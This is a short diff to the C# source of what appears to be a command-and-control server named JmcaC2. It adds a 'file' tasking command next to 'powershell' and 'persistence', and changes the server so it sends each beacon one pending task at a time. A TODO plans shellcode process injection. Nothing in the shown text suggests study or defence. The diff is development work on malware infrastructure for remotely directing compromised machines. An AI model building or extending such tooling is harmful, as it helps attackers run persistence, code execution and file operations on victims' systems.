@@ -95,7 +95,6 @@ namespace JmcaC2
                         PrintTasks();
                         break;
                     //TODO: process injection command, with shellcode passed as DATA in BeaconTask
-
                     case "powershell":
                         CreateTask(CmdPrefix, CmdArgs);
                         break;
@@ -116,8 +115,9 @@ namespace JmcaC2
                     case "persistence":
                         CreateTask(CmdPrefix, CmdArgs);
                         break;
-
-
+                    case "file":
+                        CreateTask(CmdPrefix, CmdArgs);
+                        break;
                     // add more commands as needed :)
 
                     default:
@@ -291,8 +291,10 @@ namespace JmcaC2
                                 // only send PENDING tasks for this beacon
                                 if (task.Name == beaconName && task.Status == TaskStatus.NotStarted)
                                 {
-                                    responseString += task + "\r\n\r\n";
+                                    // only send one task at a time. this is simpler
+                                    responseString += task.ToString();
                                     task.Status = TaskStatus.InProgress;
+                                    break;
                                 }
                             }
                         }
